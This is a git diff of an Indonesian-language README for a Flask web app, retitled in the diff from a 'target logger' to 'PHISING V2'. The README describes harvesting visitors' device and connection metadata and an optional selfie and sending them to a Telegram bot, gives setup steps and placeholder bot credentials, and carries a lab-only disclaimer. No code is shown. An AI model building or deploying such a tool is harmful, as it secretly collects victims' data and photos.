@@ -1,4 +1,4 @@
-# 🛰️ Pencatat Target X9x
+# 🛰️ PHISING V2
 Aplikasi web sederhana berbasis Flask yang dirancang untuk mengumpulkan metadata perangkat dan koneksi serta mengirimkannya ke bot Telegram yang dikonfigurasi.     Termasuk unggahan foto opsional (misalnya, swafoto) dari sisi klien.
 
 # ⚠️ Hanya untuk keperluan edukasi dan pengujian laboratorium yang terkontrol. Penggunaan tanpa izin dilarang.
@@ -21,9 +21,8 @@ source venv/bin/activate  # Linux/macOS
 venv\\Scripts\\activate   # Windows
 # Instal dependensi :
 pip install -r requirements.txt
-Konfigurasiconfig.txt :
 
-Sunting
+# Konfigurasiconfig.txt :
 123456789:ABCdefGHIjklMNOpqrSTUvwxYZ        <-- baris 1: Token bot Telegram
 -1001234567890                              <-- baris 2: ID chat atau grup
 
